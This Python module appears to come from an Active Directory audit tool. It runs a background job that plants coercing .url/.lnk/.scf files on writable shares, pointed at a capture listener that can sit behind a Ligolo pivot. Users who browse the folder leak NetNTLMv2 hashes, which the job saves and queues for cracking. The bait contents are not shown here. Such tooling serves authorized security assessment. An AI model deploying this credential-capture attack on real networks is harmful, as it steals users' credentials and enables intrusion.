"""Write-share NTLMv2 bait as a background job (checkpoint 4).

Plants a coercing file (``.url``/``.lnk``/``.scf``/``.library-ms``) on a writable
share as the resolved writer principal; the file's icon UNC points at OUR shared
:445 capture listener, so a user who merely BROWSES the folder is coerced into an
NTLM authentication we capture — no broadcast poisoning needed (that is the
poisoner's L2 vector; the bait is a direct L3 unicast callback).

Why a background job: in a real ``audit`` the scan cannot BLOCK waiting for a user
to browse the share (minutes / hours / days) — the CTF blocking path is fine for a
targeted engagement, but audit routes through here so the scan proceeds while the
bait waits. Capture is handled off-thread by the SHARED :445 broker
(``shared_capture_listener``), which fans every capture out to this job's sink —
so poisoning, this bait, and the NTLM auth-type sweep all consume ONE :445
listener (refcounted; ``stop_writeshare`` releasing this consumer never tears :445
down while poisoning still holds it, and vice-versa).

The runtime owns NO thread of its own: ``start`` plants the bait + acquires the
broker with the persist sink; the broker's poll thread drives captures into the
sink; ``stop`` releases the broker + removes the bait (reconciling the env-change
ledger — a bait left on a client share is an environment modification and MUST be
removed, or surfaced as ``manual_required`` if removal fails).
"""
from __future__ import annotations

import os
import threading
from typing import Any, Optional

from adscan_core import telemetry
from adscan_core.rich_output import background_console_context, print_info_debug
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.background_jobs.cracking_enqueue import enqueue_cracking_job
from adscan_internal.services.background_jobs.results_bus import JobResult, JobResultSink
from adscan_internal.services.background_jobs.shared_capture_listener import (
    get_or_create_capture_broker,
)
from adscan_core.rich_output import print_exception


class WriteShareBaitJobRuntime:
    """Live write-share-bait worker; implements the ``JobRuntime`` protocol."""

    def __init__(
        self,
        shell: Any,
        *,
        domain: str,
        target_host: str,
        listener_ip: str,
        creds: dict[str, Any],
        targets: list[Any],
        sink: JobResultSink,
        job_id: str,
        scope: str,
        file_type: str = "url",
        use_kerberos: bool = False,
        kdc_host: Optional[str] = None,
        spn_host: Optional[str] = None,
        listener_bind_ip: Optional[str] = None,
        pivot_plan: Any = None,
    ) -> None:
        self.shell = shell
        self.domain = domain
        self.target_host = target_host
        # ``listener_ip`` is the ADVERTISED callback (embedded in the bait icon
        # UNC). ``listener_bind_ip`` is the LOCAL address the shared :445 broker
        # binds; for a direct vantage the two are identical, but a pivot capture
        # advertises the agent-segment redirector host while the broker binds a
        # local address the tunneled redirect lands on.
        self.listener_ip = listener_ip
        self.listener_bind_ip = str(listener_bind_ip or "").strip() or listener_ip
        self.pivot_plan = pivot_plan
        self.creds = creds
        self.targets = targets
        self.sink = sink
        self.job_id = job_id
        self.scope = scope
        self.file_type = file_type
        self.use_kerberos = use_kerberos
        self.kdc_host = kdc_host
        self.spn_host = spn_host
        self.captured = 0
        self._drops: list[Any] = []
        self._seen: set[str] = set()
        self._active = False
        self._lock = threading.Lock()
        self._consumer_id = f"writeshare_bait@{scope}"
        self._pivot_listener_id: Optional[int] = None

    # ── JobRuntime protocol ─────────────────────────────────────────────────

    def start(self) -> bool:
        """Acquire the shared :445 broker + plant the bait. True when bait is live.

        Order matters: acquire the broker FIRST so :445 is live before the bait's
        icon UNC (which points at ``listener_ip``) is planted — a bait pointing at
        a dead listener captures nothing.
        """
        broker = get_or_create_capture_broker(self.shell)
        if not broker.acquire(
            self._consumer_id, bind_ip=self.listener_bind_ip, on_capture=self._on_capture
        ):
            print_info_debug(
                f"writeshare-bait: could not acquire shared :445 listener on "
                f"{self.listener_bind_ip}; not planting bait."
            )
            return False

        # Pivot capture: arm the Ligolo agent-side redirector AFTER the local
        # broker is bound (the redirect must land on a live listener) and BEFORE
        # the bait is planted (the icon UNC points at the redirector host). If the
        # redirector cannot be armed, honest-skip: release the broker and do not
        # plant a bait that points at a callback path that does not exist.
        if self.pivot_plan is not None:
            from adscan_internal.services.ligolo_pivot_capture import (  # noqa: PLC0415
                arm_planned_capture,
            )

            self._pivot_listener_id = arm_planned_capture(self.shell, self.pivot_plan)
            if self._pivot_listener_id is None:
                try:
                    broker.release(self._consumer_id)
                except Exception:  # noqa: BLE001
                    pass
                print_info_debug(
                    "writeshare-bait: could not arm the Ligolo pivot redirector; "
                    "not planting bait (no reachable inbound-callback path)."
                )
                return False

        from adscan_internal.services.post_exploitation.ntlmv2_share_capture_service import (  # noqa: PLC0415
            plant_bait_targets,
        )

        try:
            self._drops = plant_bait_targets(
                self.shell,
                domain=self.domain,
                target_host=self.target_host,
                creds=self.creds,
                targets=self.targets,
                listener_ip=self.listener_ip,
                file_type=self.file_type,
                use_kerberos=self.use_kerberos,
                kdc_host=self.kdc_host,
                spn_host=self.spn_host,
            )
        except Exception as exc:  # noqa: BLE001 — a plant failure must not leave :445 held
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            self._drops = []

        if not self._drops:
            # Nothing planted (no writable target for the held principal) — release
            # the broker so we do not hold :445 for a bait that does not exist.
            try:
                broker.release(self._consumer_id)
            except Exception:  # noqa: BLE001
                pass
            self._teardown_pivot_listener()
            print_info_debug(
                "writeshare-bait: no bait planted (no writable target for the held "
                "credential); released the shared listener."
            )
            return False

        self._active = True
        return True

    def _teardown_pivot_listener(self) -> None:
        """Remove the armed Ligolo pivot redirector, if any. Best-effort."""
        if self._pivot_listener_id is None or self.pivot_plan is None:
            return
        try:
            from adscan_internal.services.ligolo_pivot_capture import (  # noqa: PLC0415
                teardown_planned_capture,
            )

            teardown_planned_capture(self.shell, self.pivot_plan, self._pivot_listener_id)
        except Exception as exc:  # noqa: BLE001 — teardown is best-effort
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
        finally:
            self._pivot_listener_id = None

    def stop(self) -> None:
        """Release the broker consumer + remove every planted bait (ledger reconcile)."""
        with self._lock:
            if not self._active and not self._drops:
                return
            self._active = False
            drops = list(self._drops)
            self._drops = []

        try:
            get_or_create_capture_broker(self.shell).release(self._consumer_id)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)

        # Remove the Ligolo pivot redirector before the bait so no orphan listener
        # outlives the capture window.
        self._teardown_pivot_listener()

        if not drops:
            return
        with background_console_context(f"writeshare-bait-{self.scope}"):
            try:
                from adscan_internal.services.post_exploitation.ntlmv2_share_capture_service import (  # noqa: PLC0415
                    remove_bait_drops,
                )

                remove_bait_drops(
                    self.shell,
                    domain=self.domain,
                    target_host=self.target_host,
                    drops=drops,
                    creds=self.creds,
                    use_kerberos=self.use_kerberos,
                    kdc_host=self.kdc_host,
                    spn_host=self.spn_host,
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_exception(exception=exc)

    def snapshot(self) -> dict[str, Any]:
        return {
            "captured": self.captured,
            "baits": len(self._drops),
            "target_host": self.target_host,
        }

    def is_alive(self) -> bool:
        return self._active

    # ── capture sink (called from the broker's poll thread) ─────────────────

    def _on_capture(self, obs: Any) -> None:
        """Persist one captured NetNTLM + enqueue cracking + notify. No print/prompt."""
        try:
            self._handle_capture(obs)
        except Exception as exc:  # noqa: BLE001 — a bad capture must never kill the job
            telemetry.capture_exception(exc)
            print_exception(exception=exc)

    def _handle_capture(self, obs: Any) -> None:
        from adscan_internal.cli.creds import save_ntlm_hash  # noqa: PLC0415
        from adscan_internal.services.post_exploitation.ntlmv2_share_capture_service import (  # noqa: PLC0415
            ShareCaptureCredential,
            _normalize_ntlm_version,
            _persist_captured_credential,
            _split_principal,
        )

        user = str(getattr(obs, "clean_user", "") or "")
        if not user:
            return
        key = user.casefold()
        with self._lock:
            if key in self._seen:
                return
            self._seen.add(key)

        raw_user = str(getattr(obs, "raw_user", "") or "")
        clean_user, captured_domain = _split_principal(raw_user, self.domain)
        captured = ShareCaptureCredential(
            raw_user=raw_user,
            clean_user=user or clean_user,
            domain=captured_domain,
            ntlm_version=_normalize_ntlm_version(getattr(obs, "ntlm_version", None)),
            fullhash=str(getattr(obs, "fullhash", "") or ""),
        )
        _persist_captured_credential(self.shell, domain=self.domain, captured=captured)
        self.captured += 1

        marked_user = mark_sensitive(captured.clean_user, "user")
        marked_domain = mark_sensitive(captured.domain, "domain")
        self.sink(
            JobResult(
                job_id=self.job_id,
                kind="writeshare_bait",
                scope=self.scope,
                summary=(
                    f"Write-share bait captured a {captured.ntlm_version} response "
                    f"for {marked_user}@{marked_domain}"
                ),
                detail={
                    "captured": self.captured,
                    "user": captured.clean_user,
                    "domain": captured.domain,
                    "ntlm_version": captured.ntlm_version,
                    "target_host": self.target_host,
                },
            )
        )

        # Centralized background cracking (mirror the poisoning job).
        try:
            from adscan_internal.services.cracking_wordlist_policy import (  # noqa: PLC0415
                resolve_effort_or_default,
            )

            version = "v1" if "1" in str(captured.ntlm_version) else "v2"
            if save_ntlm_hash(self.shell, self.domain, version, captured.clean_user, captured.fullhash):
                hash_file = os.path.join(
                    self.shell.domains_dir,
                    self.domain,
                    self.shell.cracking_dir,
                    f"{captured.clean_user}_hashes.NTLM{version}",
                )
                enqueue_cracking_job(
                    self.shell,
                    domain=self.domain,
                    user=captured.clean_user,
                    ntlm_version=version,
                    hash_file=hash_file,
                    effort=resolve_effort_or_default(self.shell),
                )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
